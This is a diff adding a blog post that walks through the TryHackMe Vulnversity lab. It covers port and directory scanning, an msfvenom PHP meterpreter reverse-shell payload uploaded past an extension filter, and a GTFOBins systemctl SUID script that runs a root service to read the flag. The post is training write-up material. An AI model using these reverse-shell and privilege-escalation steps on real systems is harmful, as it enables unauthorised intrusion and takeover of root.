@@ -1,0 +1,234 @@
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr">
+  <head>
+    <meta charset="utf-8" />
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1, viewport-fit=cover" />
+<title>TryHackMe - Vulnversity | Blog</title>
+<meta name="description" content="Learn about active recon, web app attacks and privilege escalation." />
+<link rel="alternate" href="https://example.com/" hreflang="x-default" />
+
+<link rel="canonical" href="https://joshuachp.dev/posts/2020-09-02_tryhackme_vulnversity/" />
+<link rel="preconnect" href="https://joshuachp.dev/" />
+<link href="/pagefind/pagefind-component-ui.css" rel="stylesheet" />
+<script src="/pagefind/pagefind-component-ui.js" type="module"></script>
+  <script
+    data-goatcounter="https://a7d98e3f-b56b.goatcounter.com/count"
+    async
+    src="//gc.zgo.at/count.js"></script>
+  <noscript>
+    <img
+      src="https://a7d98e3f-b56b.goatcounter.com/count?p=" />
+  </noscript>
+
+        <link rel="preload" href="/css/main.2b8ec40bf2c2d4bc3396f47e0628957af04259b89bd4bebcfea59c3a7f3b4f16.css" as="style" />
+        <link
+          rel="stylesheet"
+          href="/css/main.2b8ec40bf2c2d4bc3396f47e0628957af04259b89bd4bebcfea59c3a7f3b4f16.css"
+          type="text/css"
+          integrity="sha256-K47EC/LC1LwzlvR&#43;BiiVevBCWbib1L68/qWcOn87TxY="
+          crossorigin="anonymous" />
+
+
+      <link
+        rel="preload"
+        href="/font/AtkinsonHyperlegibleNext-VariableFont_wght.d9f388a29cb20d8ec6ab264f41586e56e6259e4bba4e1a6aeaff473c94a5c769.woff2"
+        as="font"
+        type="font/woff2"
+        integrity="sha256-2fOIopyyDY7GqyZPQVhuVuYlnku6Thpq6v9HPJSlx2k="
+        crossorigin="anonymous" />
+<style>
+  @font-face {
+    font-family: "Atkinson Hyperlegible Next";
+    font-style: normal;
+    font-weight: 200 800;
+    font-display: swap;
+    src: url("/font/AtkinsonHyperlegibleNext-VariableFont_wght.woff2") format("woff2");
+  }
+  @font-face {
+    font-family: "Atkinson Hyperlegible Next";
+    font-style: italic;
+    font-weight: 200 800;
+    font-display: swap;
+    src: url("/font/AtkinsonHyperlegibleNext-Italic-VariableFont_wght.woff2") format("woff2");
+  }
+</style>
+
+
+        <link rel="modulepreload" href="/js/main.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.js" />
+        <script
+          type="module"
+          src="/js/main.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.js"
+          integrity="sha256-47DEQpj8HBSa&#43;/TImW&#43;5JCeuQeRkm5NMpJWZG3hSuFU="
+          crossorigin="anonymous"></script>
+
+
+  </head>
+  <body>
+    <header>
+      
+  <nav>
+    <ul>
+    <li>
+      <a href="/">Home</a>
+    </li>
+    <li>
+      <a aria-current="true" class="ancestor" href="/posts/">Posts</a>
+    </li>
+    <li>
+      <a href="/tags/">Tags</a>
+    </li>
+    </ul>
+  </nav>
+
+<pagefind-modal-trigger></pagefind-modal-trigger>
+<pagefind-modal></pagefind-modal>
+
+    </header>
+    <main>
+      
+    <h1 id="tryhackme---vulnversity">TryHackMe - Vulnversity</h1>
+<blockquote>
+<p>The room link can be found at <a href="https://tryhackme.com/room/vulnversity">TryHackMe - Vulnversity</a></p>
+</blockquote>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>First, we do a simple Nmap scan</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>nmap $IP
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>21/tcp   open  ftp
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh
+</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds
+</span></span><span style="display:flex;"><span>3128/tcp open  squid-http
+</span></span><span style="display:flex;"><span>3333/tcp open  dec-notes
+</span></span></code></pre></div><p>We find six ports open, we can now make a more in-depth scan with <code>nmap -sC -sV $IP</code>. It will found
+the service type and version.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>nmap -sC -sV $IP
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE     VERSION
+</span></span><span style="display:flex;"><span>21/tcp   open  ftp         vsftpd 3.0.3
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>3128/tcp open  http-proxy  Squid http proxy 3.5.12
+</span></span><span style="display:flex;"><span>|_http-server-header: squid/3.5.12
+</span></span><span style="display:flex;"><span>|_http-title: ERROR: The requested URL could not be retrieved
+</span></span><span style="display:flex;"><span>3333/tcp open  http        Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Vuln University
+</span></span><span style="display:flex;"><span>Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: 1h19m59s, deviation: 2h18m34s, median: 0s
+</span></span><span style="display:flex;"><span>|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span style="color:#f92672">(</span>unknown<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| smb-os-discovery:
+</span></span><span style="display:flex;"><span>|   OS: Windows 6.1 <span style="color:#f92672">(</span>Samba 4.3.11-Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   Computer name: vulnuniversity
+</span></span><span style="display:flex;"><span>|   NetBIOS computer name: VULNUNIVERSITY<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+</span></span><span style="display:flex;"><span>|   Domain name: <span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+</span></span><span style="display:flex;"><span>|   FQDN: vulnuniversity
+</span></span><span style="display:flex;"><span>|_  System time: 2020-09-02T14:44:45-04:00
+</span></span><span style="display:flex;"><span>| smb-security-mode:
+</span></span><span style="display:flex;"><span>|   account_used: guest
+</span></span><span style="display:flex;"><span>|   authentication_level: user
+</span></span><span style="display:flex;"><span>|   challenge_response: supported
+</span></span><span style="display:flex;"><span>|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| smb2-security-mode:
+</span></span><span style="display:flex;"><span>|   2.02:
+</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span>| smb2-time:
+</span></span><span style="display:flex;"><span>|   date: 2020-09-02T18:44:46
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span></code></pre></div><p>From the OpenSSH version we can find out that the os type is Ubuntu Linux.</p>
+<h3 id="gobuster">Gobuster</h3>
+<p>There is an HTTP port open on <code>3333</code> so we can start enumerating it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -w GitHub/SecLists/Discovery/Web-Content/big.txt -u http://10.10.232.204:3333/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.0.1
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@_FireFart_<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:            http://10.10.232.204:3333/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:        <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:       GitHub/SecLists/Discovery/Web-Content/big.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Status codes:   200,204,301,302,307,401,403
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:     gobuster/3.0.1
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:        10s
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>2020/09/02 20:52:40 Starting gobuster
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>/.htaccess <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>/.htpasswd <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>/css <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>/fonts <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>/images <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>/internal <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>/js <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>/server-status <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>2020/09/02 20:56:58 Finished
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span></code></pre></div><p>We can see various pages. Visiting them we find that on <code>/internal</code> there is an upload form.</p>
+<p>If we run gobuster again on this path we can find a second directory <code>/internal/uploads/</code>.</p>
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="compromise-the-webserver">Compromise the webserver</h3>
+<p>We start by generating our reverse shell. I chose to use a meterpreter reverse shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom --payload php/meterpreter/reverse_tcp  LHOST<span style="color:#f92672">=</span>$USER_IP LPORT<span style="color:#f92672">=</span>$PORT &gt; payload.php
+</span></span></code></pre></div><p>Let&rsquo;s also start the Metasploit console with an <code>exploit/multi/handler</code>.</p>
+<p>Unfortunately if we try to upload it the extension is blocked. If we try the extensions provided in
+the image from the challenge, we find that one works. We can find the uploaded file in the
+<code>/internal/uploads/</code> directory that we found before.</p>
+<p>We now have a shell on the box.</p>
+<p>Now we background the session and use the <code>post/linux/gather/enum_system</code> to enumerate the system
+information, including the user accounts. With the <code>loot</code> command, we can list the gathered items,
+and at the end of there user list, we have the <strong>bill</strong> user. In his home directory, we can find the
+user flag which is readable by <code>www-data</code> (our user).</p>
+<h3 id="privilege-escalation">Privilege escalation</h3>
+<p>To gather more information about the box, we can use the <code>upload</code> command to upload the
+<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">linPEAS</a>
+script. This will list all the interesting information on the box, including the SUID binaries. Une
+of them sticks out, the <code>systemctl</code> executable that bad since we can execute and change the state of
+all the services on the machine without root privilege. We look up
+<a href="https://gtfobins.github.io/gtfobins/systemctl/">systemctl | GTFOBins</a> to find an easy way to
+exploit it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/sh
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TF<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp<span style="color:#66d9ef">)</span>.service
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;[Service]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Type=oneshot
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ExecStart=/bin/sh -c &#34;cat /root/root.txt &gt; /tmp/output&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[Install]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">WantedBy=multi-user.target&#39;</span> &gt; $TF
+</span></span><span style="display:flex;"><span>systemctl link $TF
+</span></span><span style="display:flex;"><span>systemctl enable --now $TF
+</span></span></code></pre></div><p>This script will create a temp service file, link, enable, and run it. The service will be run as
+root and will cat the flag into the tmp directory that is readable for us. We could also run a
+meterpreter reverse shell to gain a root shell on the box.</p>
+
+  
+  <div>
+    <div>Tags:</div>
+    <ul>
+        <li><a href="/tags/ctf/">CTF</a></li>
+        <li><a href="/tags/thm/">THM</a></li>
+    </ul>
+  </div>
+
+
+    </main>
+    <footer>
+      <p>Copyright 2026. All rights reserved.</p>
+<div class="link">
+    <a href="https://hachyderm.io/@joshuachp" rel="me" id="mastodon" target="_blank" class="icon"><svg width="74" height="79" viewBox="0 0 74 79" fill="#fff" xmlns="http://www.w3.org/2000/svg"><path d="M73.7014 17.9592C72.5616 9.62034 65.1774 3.04876 56.424 1.77536 54.9472 1.56019 49.3517.7771 36.3901.7771H36.2933c-12.9652.0-15.7468.78309-17.2236.99826C10.56 3.01348 2.78877 8.91838.903306 17.356-.00357857 21.5113-.100361 26.1181.068112 30.3439.308275 36.404.354874 42.4535.91406 48.489c.38658 4.009 1.06096 7.9861 2.01809 11.9015 1.79226 7.2312 9.04735 13.249 16.15545 15.704C26.6979 78.6548 34.8821 79.0799 42.724 77.3221 43.5866 77.1245 44.4398 76.8953 45.2833 76.6342 47.1867 76.0381 49.4199 75.3714 51.0616 74.2003 51.0841 74.1839 51.1026 74.1627 51.1156 74.1382 51.1286 74.1138 51.1359 74.0868 51.1368 74.0592V68.2108C51.1364 68.185 51.1302 68.1596 51.1185 68.1365 51.1069 68.1134 51.0902 68.0932 51.0695 68.0773 51.0489 68.0614 51.0249 68.0503 50.9994 68.0447 50.9738 68.0391 50.9473 68.0392 50.9218 68.045c-5.0242 1.181-10.1727 1.773-15.3382 1.7637C26.694 69.8087 24.3031 65.6569 23.6184 63.9285 23.0681 62.4347 22.7186 60.8764 22.5789 59.2934 22.5775 59.2669 22.5825 59.2403 22.5934 59.216 22.6043 59.1916 22.621 59.1702 22.6419 59.1533 22.6629 59.1365 22.6876 59.1248 22.714 59.1191 22.7404 59.1134 22.7678 59.1139 22.794 59.1206 27.7345 60.2936 32.799 60.8856 37.8813 60.8843c1.2223.0 2.441.0 3.6634-.0317000000000007C46.6562 60.7115 52.0437 60.454 57.0728 59.4874 57.1983 59.4628 57.3237 59.4416 57.4313 59.4098c7.9325-1.4991 15.4815-6.2047 16.2486-18.1203C73.7086 40.8204 73.7803 36.3758 73.7803 35.889 73.7839 34.2347 74.3216 24.1533 73.7014 17.9592zM61.4925 47.6918H53.1514V27.5855c0-4.2329-1.7923-6.3917-5.4378-6.3917-4.0075.0-6.0148 2.5538-6.0148 7.5981V39.7974h-8.291V28.7919c0-5.0443-2.0109-7.5981-6.0184-7.5981-3.624.0-5.4342 2.1588-5.4378 6.3917V47.6918h-8.334V26.9752c0-4.2329 1.0981-7.5957 3.2942-10.0884 2.2654-2.4868 5.237-3.7637 8.9255-3.7637 4.2691.0 7.4952 1.6155 9.6459 4.8431L37.5587 21.3949l2.079-3.4287c2.1507-3.2276 5.3768-4.8431 9.6388-4.8431 3.6849.0 6.6564 1.2769 8.929 3.7637 2.1962 2.4904 3.2942 5.8532 3.2942 10.0884L61.4925 47.6918z" fill="inherit"/></svg>
+    </a>
+</div>
+
+    </footer>
+  </body>
+</html>
